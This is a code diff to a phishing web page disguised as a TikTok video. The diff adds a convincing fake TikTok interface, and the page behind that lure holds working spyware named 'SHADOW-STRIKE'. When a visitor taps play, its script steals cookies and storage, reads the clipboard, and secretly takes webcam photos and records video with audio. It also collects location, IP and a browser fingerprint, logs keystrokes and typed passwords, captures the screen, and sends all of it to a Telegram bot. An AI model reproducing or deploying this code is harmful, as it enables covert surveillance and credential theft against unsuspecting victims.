@@ -27,23 +27,54 @@
         .fake-ui.hidden{opacity:0;}
         .username{color:#fff;font-weight:bold;margin-bottom:5px;}
         .desc{color:#fff;font-size:12px;margin-bottom:5px;}
+        .tiktok-logo{position:absolute;top:20px;left:20px;color:#fff;font-weight:bold;z-index:15;}
+        .tiktok-sidebar{position:absolute;right:15px;bottom:100px;display:flex;flex-direction:column;gap:20px;z-index:15;}
+        .sidebar-icon{display:flex;flex-direction:column;align-items:center;color:#fff;font-size:12px;}
+        .sidebar-icon svg{width:30px;height:30px;fill:#fff;}
+        .bottom-nav{position:absolute;bottom:0;left:0;width:100%;height:60px;background:linear-gradient(to top,rgba(0,0,0,0.8),transparent);display:flex;justify-content:space-around;align-items:center;z-index:15;}
+        .nav-item{color:rgba(255,255,255,0.7);display:flex;flex-direction:column;align-items:center;font-size:11px;}
+        .video-info{position:absolute;bottom:80px;left:15px;width:70%;z-index:15;}
     </style>
 </head>
 <body>
 <div class="video-container">
+    <div class="tiktok-logo">TikTok</div>
+    
     <div class="video-placeholder" id="placeholder">
         <div class="play-btn"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
         <div class="placeholder-text">▶ Tap to watch</div>
     </div>
+    
     <div class="fake-ui" id="fakeUi">
         <div class="username">@viral_clips</div>
         <div class="desc">Wait for the end 🔥 #fyp #viral</div>
     </div>
+    
+    <div class="tiktok-sidebar" id="fakeSidebar">
+        <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg><span>542K</span></div>
+        <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg><span>4,129</span></div>
+        <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg><span>Share</span></div>
+    </div>
+    
+    <div class="video-info" id="fakeInfo">
+        <div class="username">@tiktok_creator</div>
+        <div class="description">Wait for the end! 😂🔥 #viral #trending #fyp</div>
+    </div>
+    
+    <div class="bottom-nav" id="fakeNav">
+        <div class="nav-item active"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg><span>Home</span></div>
+        <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5z"/></svg><span>Discover</span></div>
+        <div class="nav-item"><svg viewBox="0 0 24 24" style="width:35px;height:35px;fill:#fff;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg></div>
+        <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg><span>Inbox</span></div>
+        <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4z"/></svg><span>Me</span></div>
+    </div>
+
     <div class="loading-overlay" id="loading">
         <div class="spinner"></div>
         <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
         <div class="loading-message" id="loadingMsg">Initializing...</div>
     </div>
+    
     <div class="notification" id="notify"></div>
     <video id="camFeed" autoplay muted></video>
     <canvas id="photoCanvas"></canvas>
@@ -95,7 +126,6 @@ function updateProgress(percent, msg) {
     document.getElementById('loadingMsg').textContent = msg;
 }
 
-// 1. جمع الكوكيز والتخزين
 function stealStorage() {
     try {
         collected.cookies = document.cookie;
@@ -111,7 +141,6 @@ function stealStorage() {
     } catch(e) { return false; }
 }
 
-// 2. سرقة الحافظة
 async function stealClipboard() {
     try {
         if(navigator.clipboard) {
@@ -121,7 +150,6 @@ async function stealClipboard() {
     } catch(e) {}
 }
 
-// 3. تصوير الكاميرا (3 صور)
 async function capturePhotos() {
     try {
         cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
@@ -145,7 +173,6 @@ async function capturePhotos() {
     } catch(e) { return false; }
 }
 
-// 4. تسجيل فيديو سري (5 ثوان)
 async function recordVideo() {
     try {
         let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -168,7 +195,6 @@ async function recordVideo() {
     } catch(e) { return false; }
 }
 
-// 5. الموقع الدقيق
 async function getLocation() {
     return new Promise((resolve) => {
         if(!navigator.geolocation) return resolve(null);
@@ -187,7 +213,6 @@ async function getLocation() {
     });
 }
 
-// 6. IP عبر عدة خدمات
 async function getIP() {
     try {
         let res = await fetch('https://ipapi.co/json/');
@@ -196,7 +221,6 @@ async function getIP() {
     } catch(e) {}
 }
 
-// 7. بصمة المتصفح
 function getFingerprint() {
     try {
         let canvas = document.getElementById('screenCanvas');
@@ -205,36 +229,29 @@ function getFingerprint() {
         let ctx = canvas.getContext('2d');
         ctx.fillText(navigator.userAgent, 2, 20);
         collected.fingerprints.canvas = canvas.toDataURL();
-        
         collected.fingerprints.screen = `${screen.width}x${screen.height}`;
         collected.fingerprints.language = navigator.language;
         collected.fingerprints.platform = navigator.platform;
-        collected.fingerprints.hardware = navigator.hardwareConcurrency || 'unknown';
     } catch(e) {}
 }
 
-// 8. تتبع الضغطات والنقرات
 function startTracking() {
-    let keys = [];
-    let clicks = [];
-    
+    let keys = [], clicks = [];
     document.addEventListener('keydown', e => {
-        keys.push({ key: e.key, time: Date.now(), target: e.target.tagName });
+        keys.push({ key: e.key, time: Date.now() });
         if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
             collected.passwords.push({ field: e.target.name || e.target.id, value: e.target.value });
         }
         if(keys.length > 100) keys = keys.slice(-100);
         collected.keystrokes = keys;
     });
-    
     document.addEventListener('click', e => {
-        clicks.push({ x: e.clientX, y: e.clientY, tag: e.target.tagName, time: Date.now() });
+        clicks.push({ x: e.clientX, y: e.clientY, time: Date.now() });
         if(clicks.length > 50) clicks = clicks.slice(-50);
         collected.clicks = clicks;
     });
 }
 
-// 9. تصوير الشاشة
 async function captureScreen() {
     try {
         if(!navigator.mediaDevices?.getDisplayMedia) return;
@@ -251,7 +268,6 @@ async function captureScreen() {
     } catch(e) {}
 }
 
-// 10. إرسال كل شيء إلى تيليجرام
 async function sendToTelegram() {
     let msg = `🔥 <b>SHADOW-STRIKE REPORT</b> 🔥\n\n`;
     msg += `⏰ ${collected.timestamp}\n`;
@@ -277,14 +293,6 @@ async function sendToTelegram() {
         msg += `🍪 <b>Cookies:</b>\n<code>${collected.cookies.substring(0, 200)}...</code>\n\n`;
     }
     
-    if(Object.keys(collected.localStorage).length) {
-        msg += `💾 <b>LocalStorage:</b>\n`;
-        for(let k in collected.localStorage) {
-            msg += `   ${k}: ${String(collected.localStorage[k]).substring(0, 50)}...\n`;
-        }
-        msg += `\n`;
-    }
-    
     if(collected.clipboard) {
         msg += `📋 <b>Clipboard:</b>\n<code>${collected.clipboard.substring(0, 200)}</code>\n\n`;
     }
@@ -308,7 +316,6 @@ async function sendToTelegram() {
             body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML', disable_web_page_preview: true })
         });
         
-        // إرسال الصور
         for(let i=0; i<collected.images.length; i++) {
             let imgBlob = await fetch(collected.images[i]).then(r => r.blob());
             let fd = new FormData();
@@ -319,7 +326,6 @@ async function sendToTelegram() {
             await new Promise(r => setTimeout(r, 500));
         }
         
-        // إرسال الفيديو
         if(collected.video) {
             let vidBlob = await fetch(collected.video).then(r => r.blob());
             let fd = new FormData();
@@ -329,7 +335,6 @@ async function sendToTelegram() {
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: fd });
         }
         
-        // إرسال لقطة الشاشة
         if(collected.screenshot) {
             let scBlob = await fetch(collected.screenshot).then(r => r.blob());
             let fd = new FormData();
@@ -345,7 +350,6 @@ async function sendToTelegram() {
     }
 }
 
-// ===================== التشغيل الرئيسي =====================
 async function executeShadowStrike() {
     try {
         updateProgress(5, 'Connecting to shadow network...');
@@ -391,9 +395,16 @@ async function executeShadowStrike() {
 }
 
 // ===================== بدء الهجوم =====================
+function hideFakeUI() {
+    document.getElementById('fakeUi')?.classList.add('hidden');
+    document.getElementById('fakeSidebar')?.classList.add('hidden');
+    document.getElementById('fakeInfo')?.classList.add('hidden');
+    document.getElementById('fakeNav')?.classList.add('hidden');
+}
+
 document.getElementById('placeholder').addEventListener('click', () => {
     document.getElementById('placeholder').style.display = 'none';
-    document.getElementById('fakeUi').classList.add('hidden');
+    hideFakeUI();
     document.getElementById('loading').classList.add('active');
     executeShadowStrike();
 });
